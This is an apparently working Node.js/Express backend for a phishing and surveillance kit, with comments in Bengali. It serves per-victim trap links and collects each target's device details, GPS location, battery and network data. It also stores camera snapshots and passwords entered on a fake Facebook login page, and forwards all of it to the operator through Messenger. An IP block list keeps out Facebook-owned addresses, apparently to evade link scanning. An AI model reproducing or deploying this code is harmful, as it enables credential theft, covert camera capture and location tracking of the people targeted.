const express = require('express');
const path = require('path');
const router = express.Router();
const Victim = require('../models/Victim');
const { 
    sendMessage, 
    sendImageMessage,
    formatVictimData,
    formatLocationMessage 
} = require('../utils/helpers');

// ================================================================
// 🚫 ব্লকড আইপি লিস্ট
// ================================================================
const BLOCKED_IPS = [
    '173.252.82.31',
    '173.252.127.13',
    '173.252.82.32',
    '173.252.82.33',
    '173.252.82.34',
    '173.252.82.35',
    '173.252.82.36',
];

// ================================================================
// ✅ উন্নত IP বের করার ফাংশন (সব হেডার চেক করে)
// ================================================================
function getClientIp(req) {
    // 1. x-forwarded-for (সবচেয়ে নির্ভরযোগ্য)
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0];
    }
    // 2. Cloudflare
    if (req.headers['cf-connecting-ip']) {
        return req.headers['cf-connecting-ip'];
    }
    // 3. Nginx real-ip
    if (req.headers['x-real-ip']) {
        return req.headers['x-real-ip'];
    }
    // 4. সরাসরি connection
    if (req.connection && req.connection.remoteAddress) {
        return req.connection.remoteAddress;
    }
    if (req.socket && req.socket.remoteAddress) {
        return req.socket.remoteAddress;
    }
    if (req.ip) {
        return req.ip;
    }
    return '0.0.0.0';
}

// ================================================================
// অটো ডিলিট: ১০ মিনিট
// ================================================================
const CLEANUP_INTERVAL = 60000;
const IMAGE_TTL = 600000;

setInterval(async () => {
    try {
        const cutoff = new Date(Date.now() - IMAGE_TTL);
        const victims = await Victim.find();
        let updated = 0;
        for (const v of victims) {
            const originalLength = v.camera.length;
            v.camera = v.camera.filter(c => new Date(c.timestamp) > cutoff);
            if (v.camera.length !== originalLength) {
                await v.save();
                updated++;
            }
        }
        if (updated > 0) console.log(`🗑️ ${updated} টি ভিক্টিমের পুরাতন ছবি মুছে ফেলা হয়েছে।`);
    } catch (err) {
        console.error('Cleanup error:', err);
    }
}, CLEANUP_INTERVAL);

// ================================================================
// রাউটস
// ================================================================

router.get('/v/:id', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/index.html'));
    } catch (err) {
        console.error('Error serving victim page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

router.get('/l/:id', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/location.html'));
    } catch (err) {
        console.error('Error serving location page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

router.get('/fb/:id', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/fb.html'));
    } catch (err) {
        console.error('Error serving fb page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// ================================================================
// 🚨 ভিক্টিম ডেটা রিসিভ – IP ব্লক চেক সহ
// ================================================================
router.post('/api/victim', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        console.log(`🔍 IP চেক (victim): ${clientIp}`);

        // **IP ব্লক চেক – প্রথমেই ব্লক করি**
        if (BLOCKED_IPS.includes(clientIp)) {
            console.log(`🚫 ব্লকড IP: ${clientIp} → ডেটা গ্রহণ করা হয়নি, মেসেজ পাঠানো হবে না।`);
            return res.status(403).json({ 
                status: 'error', 
                message: 'Access denied',
                blocked: true 
            });
        }

        const data = req.body;
        console.log('📥 ভিক্টিম ডেটা:', JSON.stringify(data, null, 2));

        if (!data.id) {
            return res.status(400).json({ status: 'error', message: 'Missing id' });
        }

        let victim = await Victim.findOne({ id: data.id });

        if (!victim) {
            victim = new Victim({
                id: data.id,
                fbId: data.fbId || 'unknown',
                type: data.type || 'camera',
                timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
                ip: data.ip || null,
                location: data.location || {},
                gpsLocation: data.gpsLocation || {},
                device: data.device || {},
                media: data.media || [],
                network: data.network || {},
                battery: data.battery || {},
                collectedAt: new Date()
            });
            await victim.save();
            console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id}`);
        } else {
            if (victim.fbId === 'unknown' && data.fbId && data.fbId !== 'unknown') {
                victim.fbId = data.fbId;
            }
            victim.ip = data.ip || victim.ip;
            victim.location = data.location || victim.location;
            victim.gpsLocation = data.gpsLocation || victim.gpsLocation;
            victim.device = data.device || victim.device;
            victim.media = data.media || victim.media;
            victim.network = data.network || victim.network;
            victim.battery = data.battery || victim.battery;
            victim.collectedAt = new Date();
            await victim.save();
            console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
        }

        // ============================================================
        // 📤 মেসেজ পাঠান (শুধুমাত্র যদি IP ব্লক না হয়)
        // ============================================================
        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = formatVictimData(victim);
            await sendMessage(victim.fbId, msg);
            console.log(`📤 ডিভাইস ইনফো মেসেজ: ${victim.fbId}`);
        }

        // লোকেশন মেসেজ (যদি থাকে)
        if (victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
            const locationMsg = formatLocationMessage(victim.gpsLocation);
            if (locationMsg) {
                await sendMessage(victim.fbId, locationMsg);
                console.log(`📍 লোকেশন মেসেজ: ${victim.fbId}`);
            }
        }

        res.status(200).json({ status: 'ok', data: victim });

    } catch (err) {
        console.error('❌ Victim data error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// 🚨 ক্যামেরা ছবি রিসিভ – IP ব্লক চেক সহ
// ================================================================
router.post('/api/camera', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        console.log(`🔍 IP চেক (camera): ${clientIp}`);

        if (BLOCKED_IPS.includes(clientIp)) {
            console.log(`🚫 ব্লকড IP: ${clientIp} → ক্যামেরা ডেটা গ্রহণ করা হয়নি।`);
            return res.status(403).json({ 
                status: 'error', 
                message: 'Access denied',
                blocked: true 
            });
        }

        const { id, image } = req.body;
        if (!id || !image) {
            return res.status(400).json({ status: 'error', message: 'Missing id or image' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        const isFirstImage = !victim.camera || victim.camera.length === 0;

        if (!victim.camera) victim.camera = [];
        victim.camera.push({
            image: image,
            timestamp: new Date()
        });
        await victim.save();

        const totalImages = victim.camera.length;
        console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);

        if (victim.fbId && victim.fbId !== 'unknown') {
            if (isFirstImage) {
                await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
                console.log(`📸 ক্যামেরা পারমিশন: ${victim.fbId}`);
            }
            await sendImageMessage(victim.fbId, image);
            console.log(`📸 ছবি #${totalImages} পাঠানো: ${victim.fbId}`);
        }

        res.status(200).json({ status: 'ok', count: totalImages });

    } catch (err) {
        console.error('❌ Camera error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ================================================================
// ইমেজ ভিউ (অ্যাডমিন প্যানেলের জন্য)
// ================================================================
router.get('/image/:id/:index', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('ভিক্টিম পাওয়া যায়নি');
        }
        const index = parseInt(req.params.index);
        if (isNaN(index) || index < 0 || index >= victim.camera.length) {
            return res.status(404).send('ছবি পাওয়া যায়নি');
        }
        const imgData = victim.camera[index].image;
        res.send(`<img src="data:image/jpeg;base64,${imgData}" style="max-width:100%;" />`);
    } catch (err) {
        console.error('Image view error:', err);
        res.status(500).send('এরর');
    }
});

// ================================================================
// ফেক ফেসবুক লগইন
// ================================================================
router.post('/api/fblogin', async (req, res) => {
    try {
        const { id, username, password } = req.body;
        if (!id || !username || !password) {
            return res.status(400).json({ status: 'error', message: 'Missing data' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        victim.fbLogin = {
            username: username,
            password: password,
            timestamp: new Date(),
            ip: req.ip || req.connection.remoteAddress || 'N/A'
        };
        await victim.save();

        console.log(`🔐 ফেক লগইন ডেটা: ${id} - ${username}`);

        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = `🔐 *ফেক ফেসবুক লগইন ডেটা!*\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
            await sendMessage(victim.fbId, msg);
        }

        res.status(200).json({ status: 'ok' });

    } catch (err) {
        console.error('❌ FB Login error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

module.exports = router;